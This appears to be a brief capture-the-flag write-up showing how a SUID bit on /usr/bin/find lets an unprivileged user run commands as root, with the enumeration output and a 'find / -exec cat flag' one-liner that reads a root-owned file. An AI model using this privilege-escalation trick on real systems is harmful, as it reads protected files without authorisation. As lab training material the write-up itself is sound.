## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/find`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/find
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/find
```

-The `s` in `-rws` indicates it's a SUID binary.
-`find` runs with **root privileges**.

## üöÄ Exploitation

The `find` command in Linux is used to search for files and directories in a directory hierarchy based on name, size, type, time, permissions, and many other filters ‚Äî and optionally run commands on them.

Thus we can simply run commnds for a file using find just like `env`.

```bash
find / -exec cat flag \;
```
